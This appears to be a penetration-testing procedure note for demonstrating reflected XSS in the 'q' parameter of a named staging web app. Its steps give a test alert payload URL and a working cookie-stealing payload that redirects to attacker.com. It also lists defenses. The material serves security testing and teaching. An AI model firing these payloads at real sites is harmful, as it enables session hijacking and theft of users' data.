---
id: proc-uzbey-xss-demo
tags:
  - xss
  - reflected-xss
  - web
  - javascript
  - injection
type: procedure
tools: []
tactics:
  - '[[Execution]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
updated_at: '2025-12-14T03:15:27.070Z'
skill_level: beginner
impact_level: medium
detection_risk: low
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Demonstrate Reflected XSS in Query Parameter

## Summary

This procedure outlines how to test and exploit a reflected cross-site scripting (XSS) vulnerability in a web application's query parameter, specifically the 'q' parameter in the Uzbey staging app. By injecting a malicious JavaScript payload, an attacker can execute arbitrary code in the victim's browser, leading to potential session hijacking, data theft, or phishing attacks.

## Description

The vulnerability arises from insufficient input sanitization or output encoding for the 'q' parameter on https://staging.uzbey.com/. When set to a value like 'user', the parameter reflects user input directly into the HTML without escaping, allowing XSS payloads to execute in the browser context. This is a classic reflected XSS, exploitable via social engineering (e.g., tricking a user into clicking a malicious link). Expected outcomes include immediate script execution, such as alerts or data exfiltration to an attacker-controlled server. Prerequisites include a web browser and access to the target URL; no authentication is needed.

## Requirements

1. Web browser (e.g., Chrome, Firefox) with developer tools enabled for inspecting page source
2. Network access to https://staging.uzbey.com/ (no VPN or special permissions required)
3. Optional: Attacker-controlled server for exfiltration testing (e.g., a simple HTTP listener)

## Defense

Defensive measures and detection strategies:

- Implement input validation and output encoding (e.g., using HTML entity encoding for user inputs)
- Use Content Security Policy (CSP) headers to restrict script execution
- Monitor web server logs for suspicious query parameters containing script tags
- Employ Web Application Firewalls (WAFs) to block common XSS payloads

## Objectives

1. Confirm the vulnerability by executing a benign JavaScript payload
2. Demonstrate impact through data theft simulation (e.g., cookie exfiltration)
3. Highlight remediation needs for parameter sanitization

## Instructions

### Step 1: Test Basic Payload Injection

**Context**: Verify if the 'q' parameter reflects input without sanitization by appending a simple script tag to the URL.

Visit the following URL in a web browser:

https://staging.uzbey.com/?q=%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E

> This URL-encoded payload (<script>alert('XSS')</script>) injects and executes JavaScript, popping an alert if vulnerable. Inspect the page source to confirm the script is reflected unescaped.

### Step 2: Simulate Advanced Exploitation

**Context**: Escalate to demonstrate real-world impact, such as stealing session cookies or browser data.

Modify the URL to include an exfiltration payload:

https://staging.uzbey.com/?q=%3Cscript%3Edocument.location%3D%27http%3A%2F%2Fattacker.com%2Fsteal%3Fcookie%3D%27%2Bdocument.cookie%3C%2Fscript%3E

> If successful, the browser redirects to the attacker's server, appending the victim's cookies. Use browser dev tools (F12 > Network tab) to monitor the request and confirm data transmission.

### Step 3: Validate and Document

**Context**: Ensure the vulnerability is reproducible and note any context-specific behaviors.

- Reload the page multiple times to confirm consistent execution
- Test variations (e.g., ?q=user<script>alert(1)</script>) to identify exact reflection points
- Capture screenshots or logs of the alert and network requests for reporting

> Expected output includes JavaScript execution errors in console if partially sanitized, or full payload success.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[JavaScript]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- [[xss]]
- [[reflected-xss]]
- [[web]]
- [[JavaScript]]
- [[injection]]
